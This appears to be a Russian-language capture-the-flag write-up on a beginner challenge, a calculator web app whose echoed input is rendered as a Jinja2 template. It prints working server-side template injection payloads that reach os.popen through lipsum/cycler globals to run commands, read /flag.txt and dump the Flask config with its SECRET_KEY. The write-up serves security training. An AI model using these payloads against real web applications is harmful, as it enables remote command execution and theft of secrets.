# [Beginner] Clearline

http://159.194.244.226:8082/ - «CLEARLINE - Expression Console». Одно поле  
ввода, считает арифметику по строгой грамматике: числа, `+ - * / // % **`,  
скобки, унарные знаки; степень ограничена 64, промежуточные значения - ниже  
2**4096, ввод - 512 символов. Сам вычислитель при этом сделан честно: имена,  
вызовы, атрибуты и строки режутся на уровне AST, а рандомный дифф-фаззинг на  
700 выражений против локального CPython не нашёл ни одного расхождения. Ломать  
калькулятор бесполезно.

Дырка нашлась не в нём, а в эхе. Введённое выражение печатается обратно на  
страницу в панель результата, и эта копия рендерится на сервере как шаблон  
Jinja2. Вердикт («это не числовое выражение») вообще не важен, рендер всё равно  
происходит:

```bash  
curl 'http://159.194.244.226:8082/?expr={{7*7}}'  
# в строке Input: 49  
```

Дальше классика SSTI. Через встроенные глобалы Jinja `lipsum`/`cycler` и их  
`__globals__` достаётся модуль os, а это уже выполнение команд:

?expr={{lipsum.__globals__['os'].popen('id').read()}}  
    -> uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),0(root)

Флаг в контейнере лежит в /flag.txt (43 байта, читается всеми):

?expr={{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}  
    -> kubstu{cl34rl1n3_t3mpl4t3_1nj3ct_983a0807}

Заодно вытянулся и `{{config}}` - весь Flask-конфиг вместе с SECRET_KEY, так что  
дырявый был не только рендер. Флаг прочитал ещё раз через цепочку  
`cycler.__init__.__globals__.os` — значение то же.
